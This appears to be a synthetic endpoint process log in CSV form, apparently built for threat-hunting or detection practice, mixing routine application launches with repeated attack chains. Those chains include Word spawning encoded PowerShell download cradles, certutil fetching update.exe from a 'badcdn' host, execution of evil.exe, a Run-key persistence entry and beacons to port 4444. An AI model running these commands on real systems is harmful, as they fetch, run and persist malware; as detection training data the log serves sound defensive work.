timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-06 04:59:00,fin-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-06 05:00:00,eng-ws-01,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-06 05:01:00,eng-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
2026-04-06 05:02:00,corp-ws-01,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",172.16.10.8,0,none
2026-04-06 05:03:00,ops-ws-02,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-06 05:04:00,eng-ws-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-06 05:05:00,sales-lt-01,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-06 05:06:00,ops-ws-02,liam,outlook.exe,explorer.exe,"outlook.exe /recycle ""liam@company.com""",142.250.183.14,443,outlook
2026-04-06 05:07:00,sales-lt-01,george,zoom.exe,explorer.exe,zoom.exe --background-task-mode,185.199.108.153,443,zoom-client
2026-04-06 05:07:00,eng-ws-02,diana,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-06 05:08:00,corp-ws-02,farah,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-06 05:08:00,eng-ws-02,diana,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-06 05:09:00,corp-ws-04,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-06 05:10:00,eng-ws-02,liam,code.exe,explorer.exe,"code.exe ""C:\Users\liam\Documents\project""",10.2.10.15,445,none
2026-04-06 05:11:00,eng-ws-02,liam,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
2026-04-06 05:12:00,corp-ws-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",1.1.1.1,443,outlook
2026-04-06 05:13:00,corp-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-06 05:14:00,fin-ws-02,karen,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-06 05:15:00,sales-lt-01,ethan,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-06 05:16:00,sales-lt-01,liam,slack.exe,explorer.exe,slack.exe --background-task-mode,1.1.1.1,443,slack-client
2026-04-06 05:17:00,hr-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-06 05:18:00,corp-ws-04,george,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.10,0,none
2026-04-06 05:19:00,ops-ws-01,charlie,zoom.exe,explorer.exe,zoom.exe --background-task-mode,185.199.108.153,443,zoom-client
2026-04-06 05:20:00,corp-ws-04,ethan,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-06 05:21:00,hr-ws-01,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",172.16.4.25,0,none
2026-04-06 05:22:00,corp-ws-03,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
2026-04-06 05:23:00,eng-ws-02,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",45.33.32.156,443,outlook
2026-04-06 05:24:00,ops-ws-01,julia,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-06 05:25:00,fin-ws-01,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-06 05:26:00,hr-ws-01,diana,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-06 05:27:00,eng-ws-01,karen,teams.exe,explorer.exe,teams.exe --background-task-mode,52.95.110.1,443,teams-client
2026-04-06 05:28:00,ops-ws-01,helen,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-06 05:29:00,fin-ws-01,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",10.2.10.15,0,none
2026-04-06 05:30:00,eng-ws-01,liam,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-06 05:31:00,sales-lt-01,farah,teams.exe,explorer.exe,teams.exe --background-task-mode,104.18.20.12,443,teams-client
2026-04-06 05:32:00,eng-ws-02,irfan,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-06 05:33:00,fin-ws-02,irfan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-06 05:34:00,eng-ws-02,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",10.1.5.12,0,none
2026-04-06 05:35:00,eng-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,msedge
2026-04-06 05:36:00,fin-ws-02,charlie,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
2026-04-06 05:37:00,corp-ws-03,farah,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
2026-04-06 05:38:00,ops-ws-01,helen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-06 05:39:00,eng-ws-02,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",104.18.20.12,443,outlook
2026-04-06 05:40:00,sales-lt-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-06 05:41:00,eng-ws-01,liam,zoom.exe,explorer.exe,zoom.exe --background-task-mode,142.250.183.14,443,zoom-client
2026-04-06 05:42:00,sales-lt-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,msedge
2026-04-06 05:43:00,corp-ws-04,irfan,teams.exe,explorer.exe,teams.exe --background-task-mode,185.199.108.153,443,teams-client
2026-04-06 05:44:00,fin-ws-02,liam,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-06 05:45:00,fin-ws-01,karen,code.exe,explorer.exe,"code.exe ""C:\Users\karen\Documents\project""",192.168.1.12,445,none
2026-04-06 05:46:00,ops-ws-02,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-06 05:47:00,corp-ws-02,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-06 05:48:00,corp-ws-01,george,zoom.exe,explorer.exe,zoom.exe --background-task-mode,52.95.110.1,443,zoom-client
2026-04-06 05:49:00,corp-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-06 05:50:00,corp-ws-03,julia,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-06 05:51:00,corp-ws-02,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",104.18.20.12,443,outlook
2026-04-06 05:52:00,fin-ws-02,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",10.0.0.10,0,none
2026-04-06 05:53:00,ops-ws-01,george,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-06 05:54:00,ops-ws-01,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-06 05:55:00,fin-ws-01,charlie,teams.exe,explorer.exe,teams.exe --background-task-mode,45.33.32.156,443,teams-client
2026-04-06 05:56:00,ops-ws-02,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-06 05:57:00,eng-ws-01,diana,winword.exe,explorer.exe,winword.exe /background,192.168.10.9,0,none
2026-04-06 05:58:00,eng-ws-01,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-06 05:59:00,eng-ws-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.2.10.15,0,none
2026-04-06 06:21:00,corp-ws-04,george,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-06 06:22:00,corp-ws-04,george,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-06 06:23:00,corp-ws-04,george,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-06 06:58:00,corp-ws-04,irfan,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-06 06:59:00,corp-ws-04,irfan,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-06 07:51:00,eng-ws-02,julia,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-06 07:52:00,eng-ws-02,julia,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-06 07:53:00,eng-ws-02,julia,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-06 09:16:00,eng-ws-01,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-06 09:17:00,eng-ws-01,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-06 10:32:00,eng-ws-02,farah,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-06 10:33:00,eng-ws-02,farah,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-06 10:34:00,eng-ws-02,farah,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-06 11:27:00,sales-lt-01,diana,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-06 11:28:00,sales-lt-01,diana,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-06 12:27:00,hr-ws-01,george,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-06 12:28:00,hr-ws-01,george,evil.exe,explorer.exe,C:\Users\george\AppData\Local\Temp\evil.exe,10.0.1.15,0,none
2026-04-06 12:29:00,hr-ws-01,george,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.0.5,0,none
2026-04-06 13:32:00,fin-ws-02,bob,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-06 13:33:00,fin-ws-02,bob,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-06 14:35:00,corp-ws-01,diana,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-06 14:36:00,corp-ws-01,diana,evil.exe,explorer.exe,C:\Users\diana\AppData\Local\Temp\evil.exe,192.168.1.12,0,none
2026-04-06 14:37:00,corp-ws-01,diana,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.0.5,0,none
2026-04-06 15:23:00,eng-ws-02,irfan,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-06 15:24:00,eng-ws-02,irfan,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-06 15:25:00,eng-ws-02,irfan,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-06 16:22:00,hr-ws-01,diana,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-06 16:23:00,hr-ws-01,diana,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-06 16:24:00,hr-ws-01,diana,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-06 17:46:00,eng-ws-01,diana,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-06 17:47:00,eng-ws-01,diana,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-06 17:48:00,eng-ws-01,diana,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-06 18:20:00,fin-ws-01,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-06 18:21:00,fin-ws-01,helen,evil.exe,explorer.exe,C:\Users\helen\AppData\Local\Temp\evil.exe,10.0.2.20,0,none
2026-04-06 18:22:00,fin-ws-01,helen,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.2.10.15,0,none
2026-04-06 19:27:00,hr-ws-01,karen,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-06 19:28:00,hr-ws-01,karen,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-06 20:08:00,eng-ws-01,karen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-06 20:09:00,eng-ws-01,karen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-06 20:10:00,eng-ws-01,karen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-06 21:19:00,corp-ws-01,liam,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-06 21:20:00,corp-ws-01,liam,evil.exe,explorer.exe,C:\Users\liam\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
2026-04-06 21:21:00,corp-ws-01,liam,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.2.10.15,0,none
2026-04-06 22:05:00,corp-ws-03,ethan,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-06 22:06:00,corp-ws-03,ethan,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-06 22:07:00,corp-ws-03,ethan,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-06 22:40:00,fin-ws-01,liam,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-06 22:41:00,fin-ws-01,liam,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-06 22:42:00,fin-ws-01,liam,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-06 23:13:00,ops-ws-02,bob,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-06 23:14:00,ops-ws-02,bob,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-07 00:07:00,ops-ws-01,bob,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-07 00:08:00,ops-ws-01,bob,evil.exe,explorer.exe,C:\Users\bob\AppData\Local\Temp\evil.exe,172.16.4.25,0,none
2026-04-07 00:09:00,ops-ws-01,bob,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.10.8,0,none
2026-04-07 01:29:00,corp-ws-02,karen,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-07 01:30:00,corp-ws-02,karen,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-07 02:17:00,corp-ws-03,julia,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-07 02:18:00,corp-ws-03,julia,evil.exe,explorer.exe,C:\Users\julia\AppData\Local\Temp\evil.exe,192.168.1.12,0,none
2026-04-07 02:19:00,corp-ws-03,julia,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.0.10,0,none
2026-04-07 03:29:00,corp-ws-01,charlie,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-07 03:30:00,corp-ws-01,charlie,evil.exe,explorer.exe,C:\Users\charlie\AppData\Local\Temp\evil.exe,10.0.1.15,0,none
2026-04-07 03:31:00,corp-ws-01,charlie,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.2.20,0,none
2026-04-07 04:09:00,hr-ws-01,charlie,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-07 04:10:00,hr-ws-01,charlie,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-07 04:11:00,hr-ws-01,charlie,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-07 04:55:00,eng-ws-01,ethan,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-07 04:56:00,eng-ws-01,ethan,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-07 05:38:00,ops-ws-02,bob,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-07 05:39:00,ops-ws-02,bob,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-07 05:40:00,ops-ws-02,bob,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-07 06:50:00,corp-ws-03,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-07 06:51:00,corp-ws-03,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-07 08:08:00,corp-ws-04,helen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-07 08:09:00,corp-ws-04,helen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-07 08:10:00,corp-ws-04,helen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-07 09:02:00,fin-ws-02,diana,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-07 09:03:00,fin-ws-02,diana,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-07 10:21:00,corp-ws-03,helen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-07 10:22:00,corp-ws-03,helen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-07 10:23:00,corp-ws-03,helen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-07 11:09:00,fin-ws-02,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
